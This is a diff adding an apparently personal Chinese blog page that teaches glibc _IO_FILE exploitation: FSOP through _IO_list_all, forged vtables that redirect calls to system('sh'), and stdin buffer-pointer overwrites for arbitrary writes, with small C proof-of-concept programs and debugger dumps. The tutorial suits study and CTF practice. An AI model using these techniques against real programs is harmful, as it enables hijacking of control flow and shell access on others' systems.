@@ -1,0 +1,546 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>_IO_FILE学习 - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="之前在学习house of orange的时候，涉及到了_IO_FILE，今天就来学习一下。  
+_IO_FILE结构_IO_FILE：   
+glibc-2.2.1\libio\libio.h
+
+,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">_IO_FILE学习</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">_IO_FILE学习</h1>
+        <div class="stuff">
+            <span>十月 08, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>之前在学习house of orange的时候，涉及到了_IO_FILE，今天就来学习一下。  </p>
+<h3 id="IO-FILE结构"><a href="#IO-FILE结构" class="headerlink" title="_IO_FILE结构"></a>_IO_FILE结构</h3><p><strong>_IO_FILE：</strong>   </p>
+<pre><code class="cpp">glibc-2.2.1\libio\libio.h
+
+
+struct _IO_FILE {
+int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+/* The following pointers correspond to the C++ streambuf protocol. */
+/* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+char* _IO_read_ptr; /* Current read pointer */
+char* _IO_read_end; /* End of get area. */
+char* _IO_read_base;    /* Start of putback+get area. */
+char* _IO_write_base;   /* Start of put area. */
+char* _IO_write_ptr;    /* Current put pointer. */
+char* _IO_write_end;    /* End of put area. */
+char* _IO_buf_base; /* Start of reserve area. */
+char* _IO_buf_end;  /* End of reserve area. */
+/* The following fields are used to support backing up and undo. */
+char *_IO_save_base; /* Pointer to start of non-current get area. */
+char *_IO_backup_base; /* Pointer to first valid character of backup area */
+char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+struct _IO_marker *_markers;
+
+struct _IO_FILE *_chain;
+
+int _fileno;
+int _blksize;
+_IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small. */
+
+#define __HAVE_COLUMN /* temporary */
+/* 1+column number of pbase(); 0 is unknown. */
+unsigned short _cur_column;
+signed char _vtable_offset;
+char _shortbuf[1];
+
+/* char* _save_gptr; char* _save_egptr; */
+
+_IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有的FILE结构。</p>
+<p>在标准I/O库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于libc.so的数据段。而我们使用fopen创建的文件流是分配在堆内存上的。</p>
+<p>我们可以在libc.so中找到stdin\stdout\stderr等符号，这些符号是指向FILE结构的指针，真正结构的符号是：       </p>
+<pre><code class="cpp">_IO_2_1_stderr_
+_IO_2_1_stdout_
+_IO_2_1_stdin_
+</code></pre>
+<p><strong>_IO_FILE_complete: </strong><br>_IO_FILE结构的完全版:            </p>
+<pre><code class="cpp">struct _IO_FILE_complete
+{
+  struct _IO_FILE _file;
+#endif
+#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
+  _IO_off64_t _offset;
+# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+  /* Wide character stream stuff.  */
+  struct _IO_codecvt *_codecvt;
+  struct _IO_wide_data *_wide_data;
+  struct _IO_FILE *_freeres_list;
+  void *_freeres_buf;
+# else
+  void *__pad1;
+  void *__pad2;
+  void *__pad3;
+  void *__pad4;
+# endif
+  size_t __pad5;
+  int _mode;
+  /* Make sure we don&#39;t get into trouble again.  */
+  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
+#endif
+};
+</code></pre>
+<p><strong>_IO_FILE_plus</strong><br>_IO_FILE_plus是_IO_FILE的加强版，linux程序中每创建一个文件对象，都会为这个对象生成一个_IO_FILE_plus结构体，所有文件共享一个函数表，_IO_jump_t *vtable指向这个函数表。<br>在libc2.23版本下，32位的vtable偏移为0x94，64位偏移为0x228      </p>
+<pre><code class="cpp">glibc-2.2.1\libio\libioP.h
+struct _IO_FILE_plus
+{
+   _IO_FILE file;
+   const struct _IO_jump_t *vtable;
+};
+</code></pre>
+<p><strong>_IO_jump_t: </strong>    </p>
+<pre><code class="cpp">glibc-2.2.1\libio\libioP.h      
+
+
+struct _IO_jump_t
+{
+JUMP_FIELD(_G_size_t, __dummy);
+#ifdef _G_USING_THUNKS
+JUMP_FIELD(_G_size_t, __dummy2);
+#endif
+JUMP_FIELD(_IO_finish_t, __finish);
+JUMP_FIELD(_IO_overflow_t, __overflow);
+JUMP_FIELD(_IO_underflow_t, __underflow);
+JUMP_FIELD(_IO_underflow_t, __uflow);
+JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+/* showmany */
+JUMP_FIELD(_IO_xsputn_t, __xsputn);
+JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+JUMP_FIELD(_IO_seekoff_t, __seekoff);
+JUMP_FIELD(_IO_seekpos_t, __seekpos);
+JUMP_FIELD(_IO_setbuf_t, __setbuf);
+JUMP_FIELD(_IO_sync_t, __sync);
+JUMP_FIELD(_IO_doallocate_t, __doallocate);
+JUMP_FIELD(_IO_read_t, __read);
+JUMP_FIELD(_IO_write_t, __write);
+JUMP_FIELD(_IO_seek_t, __seek);
+JUMP_FIELD(_IO_close_t, __close);
+JUMP_FIELD(_IO_stat_t, __stat);
+JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+get_column;
+set_column;
+#endif
+};
+</code></pre>
+<p>现在以调用fclose()为例：<br><img src="https://i.loli.net/2019/10/08/x8q9AFUTI4aezwf.png" alt="1038248-20171116133911312-704355404.png"><br>假如我们能覆盖fp指针，并且自己构造一个假的_IO_FILE结构和一个假的_IO_jump_t结构，就可以控制程序流了。      </p>
+<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p><strong>介绍</strong><br>FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。           </p>
+<p>FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。              </p>
+<pre><code class="cpp">int
+_IO_flush_all_lockp (int do_lock)
+{
+  ...
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+  {
+       ...
+       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))
+               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+           {
+               result = EOF;
+          }
+        ...
+  }
+}
+</code></pre>
+<p><img src="https://i.loli.net/2019/10/08/dW3mEvOpQ5qliZJ.jpg" alt="abort_routine.001.jpeg"><br>而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
+<ul>
+<li><p>1.当libc执行abort流程时</p>
+</li>
+<li><p>2.当执行exit函数时</p>
+</li>
+<li><p>3.当执行流从main函数返回时      </p>
+</li>
+</ul>
+<p><strong>示例：</strong><br>梳理一下FSOP利用的条件，首先需要攻击者获知libc.so基址，因为_IO_list_all是作为全局变量储存在libc.so中的，不泄漏libc基址就不能改写_IO_list_all。           </p>
+<p>之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，<br>接下来的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的vtable指针。但是为了能够让我们构造的fake_FILE能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的：       </p>
+<pre><code class="cpp">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))
+               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+           {
+               result = EOF;
+          }
+</code></pre>
+<p>也就是</p>
+<ul>
+<li>fp-&gt;_mode &lt;= 0</li>
+<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base         </li>
+</ul>
+<p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的vtable和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode等数据域的偏移，这样可以在伪造的vtable中构造相应的数据:     </p>
+<pre><code class="cpp">#define _IO_list_all 0x7ffff7dd2520
+#define mode_offset 0xc0
+#define writeptr_offset 0x28
+#define writebase_offset 0x20
+#define vtable_offset 0xd8
+
+int main(void)
+{
+    void *ptr;
+    long long *list_all_ptr;
+
+    ptr=malloc(0x200);
+
+    *(long long*)((long long)ptr+mode_offset)=0x0;
+    *(long long*)((long long)ptr+writeptr_offset)=0x1;
+    *(long long*)((long long)ptr+writebase_offset)=0x0;
+    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);
+
+    *(long long*)((long long)ptr+0x100+24)=0x41414141;
+
+    list_all_ptr=(long long *)_IO_list_all;
+
+    list_all_ptr[0]=ptr;
+
+    exit(0);
+}
+</code></pre>
+<p>我们使用分配内存的前0x100个字节作为_IO_FILE_plus，后0x100个字节作为vtable，在vtable中使用0x41414141这个地址作为伪造的_IO_overflow指针。  </p>
+<p>之后，覆盖位于libc中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。            </p>
+<p>通过调用exit函数，程序会执行 _IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow。    </p>
+<pre><code class="cpp">---&gt; call _IO_overflow
+[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
+[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
+[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)
+[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)
+[#4] 0x4005ce → Name: main()
+</code></pre>
+<h3 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h3><p><strong>简介</strong><br>前面我们介绍了Linux中文件流的特性（FILE），我们可以得知Linux中的一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。</p>
+<p>因此伪造vtable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。</p>
+<p>因此vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。           </p>
+<p><strong>实践</strong><br>这里演示了修改vtable中的指针，首先需要知道_IO_FILE_plus位于哪里，对于fopen的情况下是位于堆内存，对于stdin\stdout\stderr是位于libc.so中。        </p>
+<pre><code class="cpp">int main(void)
+{
+    FILE *fp;
+    long long *vtable_ptr;
+    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);
+    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
+
+    vtable_ptr[7]=0x41414141 //xsputn
+
+    printf(&quot;call 0x41414141&quot;);
+}
+</code></pre>
+<p>根据vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系统下偏移是0xd8。之后需要搞清楚欲劫持的IO函数会调用vtable中的哪个函数。关于IO函数调用vtable的情况已经在FILE结构介绍一节给出了，知道了printf会调用vtable中的xsputn，并且xsputn的是vtable中第八项之后就可以写入这个指针进行劫持。             </p>
+<p>并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。                 </p>
+<p>利用这点可以实现给劫持的vtable函数传參，比如:        </p>
+<pre><code class="cpp">#define system_ptr 0x7ffff7a52390;
+
+int main(void)
+{
+    FILE *fp;
+    long long *vtable_ptr;
+    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);
+    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
+
+    memcopy(fp,&quot;sh&quot;,3);
+
+    vtable_ptr[7]=system_ptr //xsputn
+
+
+    fwrite(&quot;hi&quot;,2,1,fp);
+}
+</code></pre>
+<p>但是在目前libc2.23版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。      </p>
+<pre><code class="cpp">#define system_ptr 0x7ffff7a52390;
+
+int main(void)
+{
+    FILE *fp;
+    long long *vtable_addr,*fake_vtable;
+
+    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);
+    fake_vtable=malloc(0x40);
+
+    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
+
+    vtable_addr[0]=(long long)fake_vtable;
+
+    memcpy(fp,&quot;sh&quot;,3);
+
+    fake_vtable[7]=system_ptr; //xsputn
+
+    fwrite(&quot;hi&quot;,2,1,fp);
+}
+</code></pre>
+<p>我们首先分配一款内存来存放伪造的vtable，之后修改_IO_FILE_plus的vtable指针指向这块内存。因为vtable中的指针我们放置的是system函数的地址，因此需要传递参数”/bin/sh”或”sh”。</p>
+<p>因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把”sh”写入_IO_FILE_plus头部。之后对fwrite的调用就会经过我们伪造的vtable执行system(“sh”)。</p>
+<p>同样，如果程序中不存在fopen等函数创建的_IO_FILE时，也可以选择stdin\stdout\stderr等位于libc.so中的_IO_FILE，这些流在printf\scanf等函数中就会被使用到。在libc2.23之前，这些vtable是可以写入并且不存在其他检测的。     </p>
+<pre><code class="cpp">print &amp;_IO_2_1_stdin_
+$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;
+
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+</code></pre>
+<h3 id="新版本libc下IO-FILE的利用"><a href="#新版本libc下IO-FILE的利用" class="headerlink" title="新版本libc下IO_FILE的利用"></a>新版本libc下IO_FILE的利用</h3><p><strong>介绍</strong><br>在最新版本的glibc中(2.24)，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc 会在调用虚函数之前首先检查vtable地址的合法性。    </p>
+<p>如果vtable是非法的，那么会引发abort。     </p>
+<p>首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。     </p>
+<p>这里的检查使得以往使用vtable进行利用的技术很难实现：        </p>
+<p><strong>新的利用方式：</strong><br>在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。 前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。   </p>
+<pre><code class="cpp">struct _IO_FILE {
+  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;   /* Current read pointer */
+  char* _IO_read_end;   /* End of get area. */
+  char* _IO_read_base;  /* Start of putback+get area. */
+  char* _IO_write_base; /* Start of put area. */
+  char* _IO_write_ptr;  /* Current put pointer. */
+  char* _IO_write_end;  /* End of put area. */
+  char* _IO_buf_base;   /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+  int _flags2;
+  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
+};
+</code></pre>
+<p>因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用。</p>
+<p>在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。<br>示例<br>简单的观察一下_IO_FILE对于调用scanf的作用       </p>
+<pre><code class="cpp">#include &quot;stdio.h&quot;
+
+char buf[100];
+
+int main()
+{
+ char stack_buf[100];
+ scanf(&quot;%s&quot;,stack_buf);
+ scanf(&quot;%s&quot;,stack_buf);
+
+}
+</code></pre>
+<p>在执行程序第一次使用stdin之前，stdin的内容还未初始化是空的    </p>
+<pre><code class="cpp">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;== vtable
+</code></pre>
+<p>调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化       </p>
+<pre><code class="cpp">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0
+</code></pre>
+<p>进一步思考可以发现其实stdin初始化的内存是在堆上分配出来的，在这里堆的基址是0x602000，因为之前没有堆分配因此缓冲区的地址也是0x602010   </p>
+<pre><code class="cpp">Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/1/t1
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/1/t1
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/1/t1
+0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
+</code></pre>
+<p>分配的堆大小是0x400个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据          </p>
+<pre><code class="cpp">0x602000:   0x0000000000000000  0x0000000000000411 &lt;== 分配0x400大小
+0x602010:   0x000000000a333231  0x0000000000000000 &lt;== 缓冲数据
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000000
+</code></pre>
+<p>接下来我们尝试修改_IO_buf_base来实现任意地址读写，全局缓冲区buf的地址是0x7ffff7dd2740。修改_IO_buf_base和_IO_buf_end到缓冲区buf的地址  </p>
+<pre><code class="cpp">0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x00007ffff7dd2740 &lt;== _IO_buf_base
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;== _IO_buf_end
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0
+</code></pre>
+<p>之后scanf的读入数据就会写入到0x7ffff7dd2740的位置   </p>
+<pre><code class="cpp">0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000
+0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000
+</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-FILE结构"><span class="toc-number">1.</span> <span class="toc-text">_IO_FILE结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FSOP"><span class="toc-number">2.</span> <span class="toc-text">FSOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造vtable劫持程序流程"><span class="toc-number">3.</span> <span class="toc-text">伪造vtable劫持程序流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新版本libc下IO-FILE的利用"><span class="toc-number">4.</span> <span class="toc-text">新版本libc下IO_FILE的利用</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
